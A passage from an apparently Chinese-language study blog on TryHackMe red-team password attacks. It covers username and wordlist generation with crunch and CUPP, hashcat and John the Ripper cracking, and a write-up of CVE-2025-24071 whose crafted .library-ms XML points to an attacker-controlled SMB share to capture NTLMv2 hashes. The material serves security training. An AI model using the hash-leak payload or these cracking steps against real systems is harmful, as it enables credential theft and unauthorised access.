<strong><code>https://clinic.thmredteam.com/</code></strong> 解析所有单词，并生成一个 <strong>最小长度为 8</strong> 的密码字典。请注意，我们将在后续任务中使用此密码列表！</p><hr><h4 id="用户名字典"><a href="#用户名字典" class="headerlink" title="用户名字典"></a>用户名字典</h4><p>在信息收集阶段，收集目标企业员工的姓名至关重要。我们可以从目标网站提取员工姓名，并根据不同的用户名格式生成用户名列表。例如，假设已知某员工的全名 <code>&#123;first name&#125; &#123;last name&#125;</code>（如 John Smith），我们可以生成多个可能的用户名格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;first name&#125;: john</span><br><span class="line">&#123;last name&#125;: smith</span><br><span class="line">&#123;first name&#125;&#123;last name&#125;: johnsmith</span><br><span class="line">&#123;last name&#125;&#123;first name&#125;: smithjohn</span><br><span class="line">&#123;first letter of first name&#125;&#123;last name&#125;: jsmith</span><br><span class="line">&#123;first letter of last name&#125;&#123;first name&#125;: sjohn</span><br><span class="line">&#123;first letter of first name&#125;.&#123;last name&#125;: j.smith</span><br><span class="line">&#123;first letter of first name&#125;-&#123;last name&#125;: j-smith</span><br></pre></td></tr></table></figure><p>幸运的是，我们可以使用 <code>username_generator</code> 工具自动生成上述用户名格式。</p><hr><h4 id="使用-username-generator-生成用户名列表"><a href="#使用-username-generator-生成用户名列表" class="headerlink" title="使用 username_generator 生成用户名列表"></a>使用 <code>username_generator</code> 生成用户名列表</h4><p>首先，克隆 <code>username_generator</code> 仓库：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/therodri2/username_generator.git</span><br></pre></td></tr></table></figure><p>然后，进入 <code>username_generator</code> 目录：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd username_generator</span><br></pre></td></tr></table></figure><p>运行以下命令查看工具帮助信息：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 username_generator.py -h</span><br></pre></td></tr></table></figure><p><strong>示例输出：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usage: username_generator.py [-h] -w wordlist [-u]</span><br><span class="line"></span><br><span class="line">Python script to generate user lists for bruteforcing!</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            Show this help message and exit</span><br><span class="line">  -w wordlist, --wordlist wordlist  Specify path to the wordlist</span><br><span class="line">  -u, --uppercase       Also produce uppercase permutations (Disabled by default)</span><br></pre></td></tr></table></figure><hr><h4 id="生成自定义用户名列表"><a href="#生成自定义用户名列表" class="headerlink" title="生成自定义用户名列表"></a>生成自定义用户名列表</h4><p>我们将 <code>John Smith</code> 保存到 <code>users.lst</code> 文件，并使用 <code>username_generator</code> 生成用户名组合：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;John Smith&quot; &gt; users.lst</span><br><span class="line">python3 username_generator.py -w users.lst</span><br></pre></td></tr></table></figure><p><strong>示例输出：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john</span><br><span class="line">smith</span><br><span class="line">j.smith</span><br><span class="line">j-smith</span><br><span class="line">j_smith</span><br><span class="line">j+smith</span><br><span class="line">jsmith</span><br><span class="line">smithjohn</span><br></pre></td></tr></table></figure><p>这只是一个自定义用户名生成器的示例，您可以探索更多工具，或者使用自己熟悉的编程语言编写类似的工具！</p><h1 id="CVE-2025-24071：通过-RAR-ZIP-提取和-library-ms-文件发生-NTLM-哈希泄漏"><a href="#CVE-2025-24071：通过-RAR-ZIP-提取和-library-ms-文件发生-NTLM-哈希泄漏" class="headerlink" title="CVE-2025-24071：通过 RAR&#x2F;ZIP 提取和 .library-ms 文件发生 NTLM 哈希泄漏"></a><a href="https://cti.monster/blog/2025/03/18/CVE-2025-24071.html#title">CVE-2025-24071：通过 RAR&#x2F;ZIP 提取和 .library-ms 文件发生 NTLM 哈希泄漏</a></h1><p>当一个 <strong>特制的 <code>.library-ms</code> 文件</strong>（其中包含 SMB 路径）被压缩进 <strong>RAR&#x2F;ZIP 归档</strong> 并随后解压时，<strong>Windows 资源管理器</strong> 会 <strong>自动解析</strong> 该文件的内容。这种行为源于 Windows 资源管理器的 <strong>内置索引和预览机制</strong>，即使用户 <strong>未手动打开或点击</strong> 该文件，系统仍会主动处理其中的内容，以 <strong>生成预览、缩略图或索引元数据</strong>。</p><p>.library-ms 文件的作用</p><p><code>.library-ms</code> 文件是一种 <strong>基于 XML 的格式</strong>，Windows 资源管理器将其 <strong>信任</strong> 用于定义 <strong>搜索路径和库位置</strong>。在解压过程中，Windows 的 <strong>索引服务</strong> 以及资源管理器的 <strong>内置文件解析机制</strong> 会立即解析 <code>.library-ms</code> 文件的内容，以 <strong>渲染适当的图标、缩略图或元数据信息</strong>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;</span><br><span class="line">    &lt;simpleLocation&gt;&lt;url&gt;\\attacker-controlled-smb-server\share&lt;/url&gt;&lt;/simpleLocation&gt;</span><br><span class="line">&lt;/libraryDescription&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在提取时，Windows 资源管理器会尝试自动解析此 SMB 路径（\192.168.1.116\shared）以收集元数据并索引文件信息。此操作触发了从受害者系统到攻击者控制的 SMB 服务器的隐式 NTLM 身份验证握手。因此，受害者的 NTLMv2 哈希值会在没有显式用户交互的情况下发送出去。</p><p>该漏洞的出现是因为 Windows 资源管理器隐式信任 .library-ms 文件，并在文件从归档中提取后立即自动处理某些文件类型。攻击者利用这种隐式信任和自动文件处理行为泄露凭据，这些凭据随后可以用于传递哈希攻击或离线破解 NTLM 哈希。</p><p>自动文件处理观察 使用 Procmon，我们可以清晰地观察到，在提取 .library-ms 文件后，Explorer.exe 和搜索协议主机（SearchProtocolHost.exe）等索引服务会自动执行以下操作：</p><p>CreateFile：文件被资源管理器自动打开。 ReadFile：读取文件内容以提取元数据。 QueryBasicInformationFile：执行元数据查询。 CloseFile：处理完文件后关闭文件。 此外，SearchProtocolHost.exe 作为 Windows 文件索引服务的一部分被调用。在 Explorer.exe 完成初步处理后，索引服务会重新打开并读取文件以将其内容编入索引。这进一步确认了文件提取后自动处理的行为：</p><p>CreateFile, ReadFile, QueryBasicInformationFile, CloseFile：由 SearchProtocolHost.exe 执行，将文件内容添加到搜索索引中。 这些操作充分证明了 Windows 在提取文件后立即自动处理文件，而无需任何显式的用户交互。Explorer.exe 和 SearchProtocolHost.exe 会自动读取并处理 .library-ms 文件的 XML 内容，启动连接到嵌入其中的 SMB 路径的尝试。</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250327221001731.png" alt="image-20250327221001731"></p><p>监听网卡</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250327185941924.png" alt="image-20250327185941924"></p><p>运行poc.py填入文件名和攻击机的ip</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250327190227716.png" alt="image-20250327190227716"></p><p>然后解压生成的压缩包</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250327185957727.png" alt="image-20250327185957727"></p><p>即拿到了用户名和hash</p><h3 id="密码分析2"><a href="#密码分析2" class="headerlink" title="密码分析2"></a>密码分析2</h3><h4 id="Keyspace-Technique键空间技术"><a href="#Keyspace-Technique键空间技术" class="headerlink" title="Keyspace Technique键空间技术"></a>Keyspace Technique键空间技术</h4><p>Crunch 可根据您指定的条件创建密码字典。<br> 生成的输出可以显示在屏幕上、保存到文件中，或传输到另一个程序。</p><p><strong>用法</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crunch [最小长度] [最大长度] [其他选项]</span><br></pre></td></tr></table></figure><p>请参考 <code>man</code> 页面以获取 crunch 的使用说明和示例。</p><hr><p>下面的示例创建了一个包含所有可能 2 个字符组合的字典，字符范围包括 <code>0-4</code> 和 <code>a-d</code>。我们可以使用 <code>-o</code> 参数指定输出文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@thm$ crunch 2 2 01234abcd -o crunch.txt</span><br></pre></td></tr></table></figure><p>Crunch 现在将生成以下数据量：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">243 字节</span><br><span class="line">0 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br></pre></td></tr></table></figure><p>Crunch 生成的行数：<code>xx</code><br> <strong>crunch: 100% 完成输出生成</strong></p><p>部分示例输出如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@thm$ cat crunch.txt</span><br><span class="line">00</span><br><span class="line">01</span><br><span class="line">02</span><br><span class="line">03</span><br><span class="line">04</span><br><span class="line">0a</span><br><span class="line">0b</span><br><span class="line">0c</span><br><span class="line">0d</span><br><span class="line">10</span><br><span class="line">...</span><br><span class="line">cb</span><br><span class="line">cc</span><br><span class="line">cd</span><br><span class="line">d0</span><br><span class="line">d1</span><br><span class="line">d2</span><br><span class="line">d3</span><br><span class="line">d4</span><br><span class="line">da</span><br><span class="line">db</span><br><span class="line">dc</span><br><span class="line">dd</span><br></pre></td></tr></table></figure><p>值得注意的是，crunch 生成的字典大小取决于密码的长度和字符组合选项。例如，以下命令创建了一个包含 <strong>8 个字符</strong>的字典，字符范围包括 <strong>0-9</strong>、<strong>a-f（小写）</strong> 和 <strong>A-F（大写）</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crunch 8 8 0123456789abcdefABCDEF -o crunch.txt</span><br></pre></td></tr></table></figure><p>生成的文件大小为 <strong>459GB</strong>，包含 <strong>54,875,873,536</strong> 个单词。</p><p>Crunch 还允许使用 <code>-t</code> 选项指定字符集，生成符合特定格式的密码。例如，以下是一些可用的占位符：</p><ul><li><code>@</code> - 小写字母</li><li><code>,</code> - 大写字母</li><li><code>%</code> - 数字</li><li><code>^</code> - 特殊字符（包括空格）</li></ul><p>假设我们已知部分密码，并且密码以 <strong>“pass”</strong> 开头，后面跟着两个数字，我们可以使用 <code>%</code> 占位符匹配数字，生成符合该模式的字典：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@thm$ crunch 6 6 -t pass%%</span><br></pre></td></tr></table></figure><p>生成的数据量：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">700 字节</span><br><span class="line">0 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br></pre></td></tr></table></figure><p><strong>crunch 生成的行数：100</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pass00</span><br><span class="line">pass01</span><br><span class="line">pass02</span><br><span class="line">pass03</span><br></pre></td></tr></table></figure><hr><h4 id="CUPP-常见用户密码生成器"><a href="#CUPP-常见用户密码生成器" class="headerlink" title="CUPP - 常见用户密码生成器"></a>CUPP - 常见用户密码生成器</h4><p><strong>CUPP（Common User Passwords Profiler）</strong> 是一个基于 Python 的自动化交互工具，可用于创建自定义密码字典。如果已知目标的部分信息（如生日、宠物名、公司名称等），CUPP 可以利用这些信息生成可能的密码。此外，CUPP 还支持 <strong>1337&#x2F;leet 模式</strong>，可将字母替换为类似的数字，例如：</p><ul><li><strong>a → 4</strong></li><li><strong>i → 1</strong></li><li><strong>o → 0</strong></li><li><strong>s → 5</strong><br>更多信息可参考其 GitHub 仓库。</li></ul><h5 id="运行-CUPP"><a href="#运行-CUPP" class="headerlink" title="运行 CUPP"></a>运行 CUPP</h5><p>运行 CUPP 需要安装 <strong>Python 3</strong>。首先，使用 <code>git</code> 克隆 GitHub 仓库：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@thm$ git clone https://github.com/Mebus/cupp.git</span><br></pre></td></tr></table></figure><p><strong>克隆输出</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cloning into &#x27;cupp&#x27;...</span><br><span class="line">remote: Enumerating objects: 237, done.</span><br><span class="line">remote: Total 237 (delta 0), reused 0 (delta 0), pack-reused 237</span><br><span class="line">Receiving objects: 100% (237/237), 2.14 MiB | 1.32 MiB/s, done.</span><br><span class="line">Resolving deltas: 100% (125/125), done.</span><br></pre></td></tr></table></figure><p>然后，进入 CUPP 目录并运行 <code>cupp.py</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@thm$ python3 cupp.py</span><br></pre></td></tr></table></figure><p><strong>CUPP 启动画面</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">___________</span><br><span class="line">  cupp.py!                 # Common</span><br><span class="line">     \                     # User</span><br><span class="line">      \   ,__,             # Passwords</span><br><span class="line">       \  (oo)____         # Profiler</span><br><span class="line">          (__)    )\</span><br><span class="line">             ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]</span><br><span class="line">                           [ Mebus | https://github.com/Mebus/]</span><br></pre></td></tr></table></figure><p>CUPP 提供了以下选项：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usage: cupp.py [-h] [-i | -w FILENAME | -l | -a | -v] [-q]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help         显示帮助信息</span><br><span class="line">  -i, --interactive  交互模式，基于用户输入创建密码字典</span><br><span class="line">  -w FILENAME        改进已有字典，例如结合 WyD.pl 输出</span><br><span class="line">  -l                 从在线仓库下载大型密码字典</span><br><span class="line">  -a                 解析 Alecto 数据库中的默认用户名和密码</span><br><span class="line">  -v, --version      显示程序版本</span><br><span class="line">  -q, --quiet        静默模式（不显示 banner）</span><br></pre></td></tr></table></figure><hr><h5 id="交互模式示例："><a href="#交互模式示例：" class="headerlink" title="交互模式示例："></a>交互模式示例：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@thm$ python3 cupp.py -i</span><br></pre></td></tr></table></figure><p>CUPP 会要求输入关于目标的信息：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] 输入有关受害者的信息以创建密码字典</span><br><span class="line">[+] 如果不清楚某些信息，可直接回车跳过！</span><br><span class="line"></span><br><span class="line">&gt; 名字:</span><br><span class="line">&gt; 姓氏:</span><br><span class="line">&gt; 昵称:</span><br><span class="line">&gt; 生日 (DDMMYYYY):</span><br><span class="line"></span><br><span class="line">&gt; 配偶的名字:</span><br><span class="line">&gt; 配偶的昵称:</span><br><span class="line">&gt; 配偶的生日 (DDMMYYYY):</span><br><span class="line"></span><br><span class="line">&gt; 孩子的名字:</span><br><span class="line">&gt; 孩子的昵称:</span><br><span class="line">&gt; 孩子的生日 (DDMMYYYY):</span><br><span class="line"></span><br><span class="line">&gt; 宠物的名字:</span><br><span class="line">&gt; 公司名称:</span><br><span class="line"></span><br><span class="line">&gt; 是否要添加一些关键词？Y/[N]:</span><br><span class="line">&gt; 是否要在密码末尾添加特殊字符？Y/[N]:</span><br><span class="line">&gt; 是否要在密码末尾添加随机数字？Y/[N]:</span><br><span class="line">&gt; 是否启用 Leet 模式 (1337)? Y/[N]:</span><br><span class="line"></span><br><span class="line">[+] 正在生成密码字典...</span><br><span class="line">[+] 排序并去重...</span><br><span class="line">[+] 将字典保存为 .....txt，包含 ..... 组密码。</span><br><span class="line">&gt; 是否启用极速打印模式？(Y/n)</span><br></pre></td></tr></table></figure><p>最终，CUPP 会生成一个基于输入信息的自定义密码字典。</p><hr><h5 id="下载预置密码字典"><a href="#下载预置密码字典" class="headerlink" title="下载预置密码字典"></a>下载预置密码字典</h5><p>可以使用 <code>-l</code> 选项下载预置的密码字典：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@thm$ python3 cupp.py -l</span><br></pre></td></tr></table></figure><p>CUPP 提供多种类别：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1   Moby            14      french          27      places</span><br><span class="line">2   afrikaans       15      german          28      polish</span><br><span class="line">3   american        16      hindi           29      random</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>密码字典来源</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/</span><br></pre></td></tr></table></figure><hr><h5 id="Alecto-默认用户名和密码数据库"><a href="#Alecto-默认用户名和密码数据库" class="headerlink" title="Alecto 默认用户名和密码数据库"></a>Alecto 默认用户名和密码数据库</h5><p>CUPP 还可从 Alecto 数据库获取默认的用户名和密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@thm$ python3 cupp.py -a</span><br></pre></td></tr></table></figure><p><strong>输出</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] 下载 alectodb.csv.gz...</span><br><span class="line">[+] 导出至 alectodb-usernames.txt 和 alectodb-passwords.txt</span><br><span class="line">[+] 完成。</span><br></pre></td></tr></table></figure><hr><p><strong>总结</strong>：</p><ul><li><strong>crunch</strong> 用于生成基于特定规则的密码字典。</li><li><strong>CUPP</strong> 适用于根据已知信息创建自定义密码字典，并支持下载现有密码字典。</li></ul><h3 id="离线攻击1"><a href="#离线攻击1" class="headerlink" title="离线攻击1"></a>离线攻击1</h3><h4 id="字典攻击"><a href="#字典攻击" class="headerlink" title="字典攻击"></a><strong>字典攻击</strong></h4><p>字典攻击是一种通过使用已知单词或短语来猜测密码的技术。字典攻击完全依赖于事先收集或生成的单词列表。为了成功进行此类攻击，选择或创建最佳的候选词列表至关重要。</p><p>让我们利用前面学习的生成单词列表的知识，来演示如何执行字典攻击。这里我们将使用 Hashcat 进行一次离线字典攻击，这是一款常用的哈希破解工具。</p><p>假设我们获得了以下哈希值：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f806fc5a2a0d5ba2471600758452799c</span><br></pre></td></tr></table></figure><p>我们想要使用字典攻击来破解它。首先，我们至少需要了解以下信息：</p><ol><li>该哈希值的类型是什么？</li><li>我们要使用哪个单词列表？或者可以采用哪种攻击模式？</li></ol><p>为了识别哈希类型，我们可以使用 <code>hashid</code> 或 <code>hash-identifier</code> 等工具。例如，在本例中，<code>hash-identifier</code> 认为该哈希可能是 <strong>MD5</strong>。</p><p>需要注意的是，破解哈希所需的时间取决于所使用的硬件（CPU 和&#x2F;或 GPU）。</p><h5 id="执行字典攻击"><a href="#执行字典攻击" class="headerlink" title="执行字典攻击"></a><strong>执行字典攻击</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat (v6.1.1) starting...</span><br><span class="line">f806fc5a2a0d5ba2471600758452799c:rockyou</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Name........: MD5</span><br><span class="line">Hash.Target......: f806fc5a2a0d5ba2471600758452799c</span><br><span class="line">Time.Started.....: Mon Oct 11 08:20:50 2021 (0 secs)</span><br><span class="line">Time.Estimated...: Mon Oct 11 08:20:50 2021 (0 secs)</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 40/40 (100.00%)</span><br><span class="line">Candidates.#1....: 123456 -&gt; 123123</span><br></pre></td></tr></table></figure><p><strong>参数解析：</strong></p><ul><li><code>-a 0</code>  设置攻击模式为字典攻击。</li><li><code>-m 0</code>  设置哈希类型为 <strong>MD5</strong>（要查看其他哈希类型，可运行 <code>hashcat -h</code>）。</li><li><code>f806fc5a2a0d5ba2471600758452799c</code> 目标哈希值，可以是单个哈希，也可以是包含多个哈希的文件。</li><li><code>/usr/share/wordlists/rockyou.txt</code>  作为攻击的字典文件。</li></ul><h5 id="查看破解结果"><a href="#查看破解结果" class="headerlink" title="查看破解结果"></a><strong>查看破解结果</strong></h5><p>如果哈希已经破解，我们可以使用 <code>--show</code> 选项查看已破解的值：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt --show</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f806fc5a2a0d5ba2471600758452799c:rockyou</span><br></pre></td></tr></table></figure><p>最终破解出的密码是 <code>rockyou</code>。</p><hr><h4 id="暴力破解攻击"><a href="#暴力破解攻击" class="headerlink" title="暴力破解攻击"></a><strong>暴力破解攻击</strong></h4><p>暴力破解攻击是一种常见的攻击方式，攻击者尝试使用所有可能的密码组合，以获取对个人账户的未授权访问。</p><p><strong>字典攻击和暴力破解攻击的主要区别在于：</strong></p><ul><li><strong>字典攻击</strong> 使用包含所有可能密码的单词列表。</li><li><strong>暴力破解攻击</strong> 则尝试所有可能的字符组合。例如：<ul><li>如果某个银行账户的 PIN 码由 <strong>4 位数字</strong> 组成，我们可以从 <code>0000</code> 到 <code>9999</code> 进行尝试。</li><li>在其他情况下，也可以将数字或字母序列附加到已有的单词上，例如：<code>admin0</code>、<code>admin1</code>、…、<code>admin9999</code>。</li></ul></li></ul><p>在 Hashcat 中，我们可以使用 <strong>字符集选项</strong> 来生成特定的密码组合。</p><h5 id="查看-Hashcat-可用的字符集"><a href="#查看-Hashcat-可用的字符集" class="headerlink" title="查看 Hashcat 可用的字符集"></a><strong>查看 Hashcat 可用的字符集</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ hashcat --help</span><br></pre></td></tr></table></figure><p>部分可用字符集：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">? | 字符集</span><br><span class="line">===+=========</span><br><span class="line"> l | abcdefghijklmnopqrstuvwxyz</span><br><span class="line"> u | ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line"> d | 0123456789</span><br><span class="line"> h | 0123456789abcdef</span><br><span class="line"> H | 0123456789ABCDEF</span><br><span class="line"> s |  !&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~</span><br><span class="line"> a | ?l?u?d?s</span><br><span class="line"> b | 0x00 - 0xff</span><br></pre></td></tr></table></figure><h5 id="使用暴力破解攻击模式"><a href="#使用暴力破解攻击模式" class="headerlink" title="使用暴力破解攻击模式"></a><strong>使用暴力破解攻击模式</strong></h5><p>假设我们需要生成 <strong>4 位数</strong> 的 PIN 码组合，我们可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ hashcat -a 3 ?d?d?d?d --stdout</span><br></pre></td></tr></table></figure><p>输出示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1234</span><br><span class="line">0234</span><br><span class="line">2234</span><br><span class="line">3234</span><br><span class="line">9234</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>参数解析：</strong></p><ul><li><code>-a 3</code>  设置攻击模式为 <strong>暴力破解攻击</strong>。</li><li><code>?d?d?d?d</code>  指定密码格式为 <strong>4 位数字（0000 到 9999）</strong>。</li><li><code>--stdout</code>  将结果直接打印到终端，而不是执行实际的哈希破解。</li></ul><hr><h5 id="破解-MD5-哈希的-4-位-PIN"><a href="#破解-MD5-哈希的-4-位-PIN" class="headerlink" title="破解 MD5 哈希的 4 位 PIN"></a><strong>破解 MD5 哈希的 4 位 PIN</strong></h5><p>假设我们需要破解以下 <strong>MD5</strong> 哈希值，它的密码是一个 4 位数 PIN 码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">05A5CF06982BA7892ED2A6D38FE832D6</span><br></pre></td></tr></table></figure><p>我们可以运行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Name........: MD5</span><br><span class="line">Hash.Target......: 05a5cf06982ba7892ed2a6d38fe832d6</span><br><span class="line">Time.Started.....: Mon Oct 11 10:54:06 2021 (0 secs)</span><br><span class="line">Time.Estimated...: Mon Oct 11 10:54:06 2021 (0 secs)</span><br><span class="line">Guess.Mask.......: ?d?d?d?d [4]</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 10000/10000 (100.00%)</span><br><span class="line">Candidates.#1....: 1234 -&gt; 6764</span><br></pre></td></tr></table></figure><p>最终破解出的密码是 <strong>2021</strong>。</p><hr><h4 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a><strong>总结</strong></h4><ul><li><strong>字典攻击</strong> 依赖于预先准备好的单词列表，适用于常见或弱密码的破解。</li><li><strong>暴力破解攻击</strong> 尝试所有可能的字符组合，适用于短而复杂的密码（如 PIN 码）。</li><li><strong>Hashcat</strong> 提供了强大的功能，支持多种哈希类型和攻击模式。</li></ul><p>在实际环境中，安全实践应避免使用 <strong>弱密码</strong>，并结合 <strong>多因素认证（MFA）</strong> 以提高安全性。</p><h3 id="离线攻击2"><a href="#离线攻击2" class="headerlink" title="离线攻击2"></a>离线攻击2</h3><h4 id="规则攻击（Rule-Based-Attacks）"><a href="#规则攻击（Rule-Based-Attacks）" class="headerlink" title="规则攻击（Rule-Based Attacks）"></a>规则攻击（Rule-Based Attacks）</h4><p>规则攻击（Rule-Based Attacks）也被称为<strong>混合攻击（Hybrid Attacks）</strong>。规则攻击假设攻击者对密码策略有所了解，并通过应用规则来生成符合密码策略的密码。理论上，这种方法应该只会生成符合要求的有效密码。<br> 使用现有的**密码字典（wordlists）**可以帮助我们生成符合密码策略的密码，例如对**password**进行变形（mangling）：</p><ul><li><code>p@ssword</code></li><li><code>Pa$$word</code></li><li><code>Passw0rd</code><br>等等。</li></ul><p>在这类攻击中，我们可以使用<strong>Hashcat</strong>或<strong>John the Ripper</strong>来扩展我们的密码字典。但在本次实验中，我们主要使用<strong>John the Ripper</strong>。<br> 通常，John the Ripper 的配置文件中包含<strong>规则集（rule sets）</strong>，文件路径可能位于：</p><ul><li><code>/etc/john/john.conf</code></li><li><code>/opt/john/john.conf</code><br>具体位置取决于你的 Linux 发行版或 John the Ripper 的安装方式。</li></ul><p>我们可以查看 <code>john.conf</code> 文件，找到可用的<strong>规则列表（List.Rules）</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ cat /etc/john/john.conf | grep &quot;List.Rules:&quot; | cut -d&quot;.&quot; -f3 | cut -d&quot;:&quot; -f2 | cut -d&quot;]&quot; -f1 | awk NF</span><br></pre></td></tr></table></figure><p>示例输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JumboSingle</span><br><span class="line">o1</span><br><span class="line">o2</span><br><span class="line">i1</span><br><span class="line">i2</span><br><span class="line">best64</span><br><span class="line">d3ad0ne</span><br><span class="line">dive</span><br><span class="line">InsidePro</span><br><span class="line">T0XlC</span><br><span class="line">rockyou-30000</span><br><span class="line">specific</span><br><span class="line">ShiftToggle</span><br><span class="line">Split</span><br><span class="line">Single</span><br><span class="line">Extra</span><br><span class="line">OldOffice</span><br><span class="line">Single-Extra</span><br><span class="line">Wordlist</span><br><span class="line">Multiword</span><br><span class="line">Jumbo</span><br><span class="line">KoreLogic</span><br><span class="line">T9</span><br></pre></td></tr></table></figure><p>可以看到，John the Ripper 提供了许多可用的规则。接下来，我们将创建一个仅包含 <code>tryhackme</code> 的密码字典，并使用<strong>best64 规则</strong>来扩展这个字典。</p><h5 id="使用-best64-规则扩展密码字典"><a href="#使用-best64-规则扩展密码字典" class="headerlink" title="使用 best64 规则扩展密码字典"></a>使用 <code>best64</code> 规则扩展密码字典</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l</span><br></pre></td></tr></table></figure><p>示例输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">76p 0:00:00:00 100.00% (2021-10-11 13:42) 1266p/s pordpo</span><br><span class="line">76</span><br></pre></td></tr></table></figure><p>命令解析：</p><ul><li><code>--wordlist=</code> 指定密码字典文件</li><li><code>--rules=</code> 选择使用的规则</li><li><code>--stdout</code> 将生成的密码直接输出到终端</li><li><code>| wc -l</code> 计算生成的密码数量</li></ul><p>运行此命令后，我们的密码列表从<strong>1个</strong>扩展到了<strong>76个</strong>。</p><h5 id="使用-KoreLogic-规则扩展密码"><a href="#使用-KoreLogic-规则扩展密码" class="headerlink" title="使用 KoreLogic 规则扩展密码"></a>使用 <code>KoreLogic</code> 规则扩展密码</h5><p><code>KoreLogic</code> 规则集包含了多种内置和自定义规则，可以生成更复杂的密码。<br> 我们使用 <code>KoreLogic</code> 规则，并检查 <code>Tryh@ckm3</code> 是否包含在生成的密码列表中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ john --wordlist=single-password-list.txt --rules=KoreLogic --stdout | grep &quot;Tryh@ckm3&quot;</span><br></pre></td></tr></table></figure><p>示例输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Tryh@ckm3</span><br><span class="line">7089833p 0:00:00:02 